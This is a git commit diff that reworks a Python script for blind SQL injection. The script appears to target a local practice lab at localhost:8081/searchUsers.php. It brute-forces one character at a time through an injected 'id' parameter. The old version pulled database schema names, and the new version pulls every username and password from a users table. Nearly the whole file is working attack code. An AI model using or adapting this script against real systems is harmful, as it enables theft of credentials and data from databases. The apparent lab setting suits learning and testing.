13d2c29a2f19b0eca7a700f625a50e7332cce8a7
maxiperd <86020042+maxiperd@users.noreply.github.com>
2024-09-28 14:56:05 -0300

    Update error_based.py

--- scripts/error_based.py
+++ scripts/error_based.py
@@ -8,33 +8,34 @@ import string
 from pwn import *
 
 def def_handler(sig, frame):
-  print("\n\n[!] Exiting...\n")
-  sys.exit(1)
+    sys.exit(1)
 
 # Ctrl+C
 signal.signal(signal.SIGINT, def_handler)
+
 main_url = "http://localhost:8081/searchUsers.php"
 
 characters = string.printable
 
 def makeSQLI():
-  p1 = log.progress("Brute force")
-  p1.status("Starting brute force process")
-  time.sleep(2)
-  p2 = log.progress("Extracted data")
-  extracted_info = ""
 
-  for position in range(1,150):
-    for character in range(33, 126):
-      sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
-      
-      p1.status(sqli_url)
-      r = requests.get(sqli_url)
-      
-      if r.status_code == 200:
-        extracted_info += chr(character)
-        p2.status(extracted_info)
-        break
+    p1 = log.progress("Brute force")
+    p1.status("Starting brute force process")
+
+    time.sleep(2)
+
+    p2 = log.progress("Extracted data")
+    extracted_info=""
+
+    for position in range(1,150):
+        for character in range(33, 126):
+            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
+            p1.status(f"Position: {position}, Character: {character}")
+            r = requests.get(sqli_url)
+            if r.status_code == 200:
+                extracted_info += chr(character)
+                p2.status(extracted_info)
+                break
 
 if __name__ == '__main__':
-  makeSQLI()
+    makeSQLI()
